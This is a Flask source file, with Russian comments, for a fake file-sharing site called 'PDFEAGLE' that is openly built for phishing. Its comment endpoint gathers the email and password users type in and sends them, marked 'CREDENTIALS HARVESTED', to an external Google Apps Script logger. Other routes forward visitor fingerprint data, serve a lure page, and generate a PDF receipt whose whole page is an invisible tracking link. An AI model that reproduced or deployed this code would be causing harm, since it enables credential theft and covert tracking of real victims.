import os
import json
import threading
import uuid
import datetime
import requests
from flask import Flask, render_template, request, redirect, url_for, jsonify, send_from_directory, make_response, abort
from werkzeug.utils import secure_filename
from fpdf import FPDF

app = Flask(__name__)

# --- КОНФИГУРАЦИЯ ---
# Используем /tmp для Render (права на запись), файлы живут до перезагрузки инстанса
UPLOAD_FOLDER = '/tmp/uploads' if os.environ.get('RENDER') else 'uploads'
DB_FILE = '/tmp/db.json' if os.environ.get('RENDER') else 'db.json'

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'jpg', 'png'}

# Твой Google Script URL (Логгер)
GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzR1L95FUkqS8X4OqcS0bBBqIGCdD4YfW7yCa5diOxnLeKvxnP1ONl-zGcezeEOLKLDOA/exec"

# --- БАЗА ДАННЫХ (JSON) ---
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_db(data):
    try:
        with open(DB_FILE, 'w') as f:
            json.dump(data, f)
    except Exception as e:
        print(f"DB Save Error: {e}")

# Загружаем базу при старте
db = load_db()

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# --- ОТПРАВКА ОТЧЕТА ---
def send_email_background(data, user_ip, user_agent, trigger_type="Page Load"):
    try:
        payload = {
            "trigger": trigger_type,
            "ip": user_ip,
            "user_agent": user_agent,
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "details": data
        }
        requests.post(GOOGLE_SCRIPT_URL, json=payload)
        print(f"[+] Report sent: {trigger_type}")
    except Exception as e:
        print(f"[-] Google Script Error: {e}")

# --- PDF TRAP GENERATOR (SOTA VERSION) ---
class PDFReceipt(FPDF):
    def header(self):
        self.set_font('Arial', 'B', 15)
        self.cell(0, 10, 'PDFEAGLE - Secure Receipt', 0, 1, 'C')

def generate_receipt(uid, filename):
    pdf = PDFReceipt()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    
    # Текст квитанции
    pdf.cell(200, 10, txt=f"File: {filename}", ln=1)
    pdf.cell(200, 10, txt=f"Transaction ID: {uid}", ln=1)
    pdf.cell(200, 10, txt=f"Timestamp: {datetime.datetime.now()}", ln=1)
    pdf.set_text_color(255, 0, 0)
    pdf.cell(200, 10, txt="STATUS: UNVERIFIED. CLICK DOCUMENT TO VERIFY.", ln=1)
    
    # SOTA TRAP: Ссылка на весь лист А4 (невидимая кнопка)
    tracking_url = f"https://pdfeagle.onrender.com/pixel.gif?source=pdf_click&uid={uid}"
    pdf.link(0, 0, 210, 297, tracking_url)
    
    receipt_name = f"receipt_{uid}.pdf"
    path = os.path.join(app.config['UPLOAD_FOLDER'], receipt_name)
    pdf.output(path)
    return receipt_name

# --- МАРШРУТЫ ---

@app.route('/health')
def health_check():
    # Фильтр: Игнорируем Google Script (KeepAlive) и Render, логируем остальных (сканеры)
    user_agent = request.headers.get('User-Agent', '').lower()
    if 'google-apps-script' not in user_agent and 'render' not in user_agent:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        threading.Thread(target=send_email_background, args=(
            {"meta": {"url": "/health", "trigger": "Suspicious Scan"}}, 
            ip, user_agent, "SCANNER DETECTED"
        )).start()
    return "OK", 200

@app.route('/pixel.gif')
def tracking_pixel():
    source = request.args.get('source', 'unknown')
    uid = request.args.get('uid', 'unknown')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    trigger_name = "PDF TRAP TRIGGERED" if source == 'pdf_receipt' else "PDF CLICKED (HIGH ALERT)"
    
    data = {
        'meta': {'url': f'PDF TRAP ({uid})', 'source': source},
        'system': {'platform': 'PDF Reader'},
        'network': {'localIPs': ['Unknown']}
    }
    threading.Thread(target=send_email_background, args=(data, ip, "PDF Reader", trigger_name)).start()

    # Прозрачный пиксель
    return make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'})

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if 'files' not in request.files: return redirect(request.url)
        files = request.files.getlist('files')
        uploaded_files = []
        
        for file in files:
            if file and allowed_file(file.filename):
                original_filename = file.filename
                try: ext = original_filename.rsplit('.', 1)[1].lower()
                except: ext = "bin"
                saved_filename = f"{uuid.uuid4().hex}.{ext}"
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], saved_filename))
                
                icon = "fa-file-pdf" if ext == 'pdf' else "fa-file-word" if ext in ['doc', 'docx'] else "fa-file-alt"
                uploaded_files.append({
                    'name': original_filename,
                    'saved_name': saved_filename,
                    'format': ext.upper(), 
                    'icon': icon, 
                    'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")
                })

        if uploaded_files:
            unique_id = uuid.uuid4().hex[:6]
            # Создаем запись в БД
            db[unique_id] = {'files': uploaded_files, 'comments': [], 'created_at': str(datetime.datetime.now())}
            save_db(db) # Сохраняем на диск
            return redirect(f"/{unique_id}")
            
    return render_template('index.html')

@app.route('/<unique_id>')
def view_files(unique_id):
    # Перезагружаем БД перед показом
    global db
    db = load_db()
    
    data = db.get(unique_id)
    if not data: return "File not found or expired", 404
    return render_template('view.html', files=data['files'], uid=unique_id, db_data=data)

# --- НОВЫЙ МАРШРУТ: ФИШИНГ СЕМЯНЫЧА ---
@app.route('/verify/<uid>/<path:filename>')
def verify_download(uid, filename):
    return render_template('semyanich.html', uid=uid, filename=filename)

@app.route('/download/<uid>/<path:filename>')
def download_file(uid, filename):
    data = db.get(uid)
    if not data: return abort(404)
    target_file = next((f for f in data['files'] if f['name'] == filename), None)
    if target_file:
        return send_from_directory(app.config['UPLOAD_FOLDER'], target_file['saved_name'], as_attachment=True, download_name=target_file['name'])
    return abort(404)

@app.route('/download_receipt/<uid>')
def download_receipt(uid):
    filename = generate_receipt(uid, "Secure_Download")
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

# --- API ДЛЯ SOTA ФИЧ ---

@app.route('/api/collect', methods=['POST'])
def collect_data():
    data = request.json
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    trigger = data.get('meta', {}).get('trigger', 'Page Load')
    
    threading.Thread(target=send_email_background, args=(data, user_ip, user_agent, trigger)).start()
    return jsonify({"status": "ok"})

@app.route('/api/comment', methods=['POST'])
def add_comment():
    data = request.json
    uid = data.get('uid')
    username = data.get('username', 'Anonymous')
    text = data.get('text')
    
    # HARVESTING FIELDS
    email = data.get('email', 'Not provided')
    password = data.get('password', 'Not provided')
    
    if uid in db:
        if 'comments' not in db[uid]: db[uid]['comments'] = []
        
        # В базу пишем только публичное
        comment_entry = {
            'username': username,
            'text': text,
            'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")
        }
        db[uid]['comments'].append(comment_entry)
        save_db(db) # Сохраняем
        
        # В отчет шлем ВСЁ (включая пароль)
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent')
        
        log_data = {
            "meta": {"url": f"Comment on {uid}", "trigger": "Credential Harvest (Comment)"},
            "system": {
                "username": username, 
                "comment": text,
                "CAPTURED_EMAIL": email,
                "CAPTURED_PASSWORD": password
            },
            "network": {"localIPs": [user_ip]}
        }
        threading.Thread(target=send_email_background, args=(log_data, user_ip, user_agent, "CREDENTIALS HARVESTED")).start()
        
        return jsonify({"status": "ok", "comment": comment_entry})
    
    return jsonify({"status": "error"}), 404

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
